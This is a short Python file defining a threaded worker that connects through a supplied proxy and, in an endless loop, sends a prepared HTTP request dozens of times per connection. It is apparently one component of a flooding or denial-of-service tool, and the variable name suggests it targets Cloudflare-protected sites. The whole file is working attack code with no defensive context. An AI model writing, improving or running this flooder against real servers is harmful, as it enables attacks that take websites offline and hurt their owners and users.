import threading , socket

class RequestProxyHTTP(threading.Thread):
    def __init__(self, proxy_ip , proxy_port, request_cf , args, counter, go ,frame_info):
        threading.Thread.__init__(self)
        self.counter = counter
        self.go = go
        self.args = args
        self.frame_info = frame_info
        self.proxy_ip = proxy_ip
        self.proxy_port = proxy_port
        self.request_cf = request_cf



    def run(self):
        self.go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(self.proxy_ip), int(self.proxy_port)))
                s.send(str.encode(self.request_cf))
                print("Request is sent: ", self.counter)
                try:
                    for y in range(50):
                        s.send(str.encode(self.request_cf))
                except:
                    s.close()
                    print(f"Exception in line {self.frame_info.lineno} , {self.__class__.__name__}")
            except:
                print(f"Socket is not created line: {self.frame_info.lineno}, {self.__class__.__name__}")


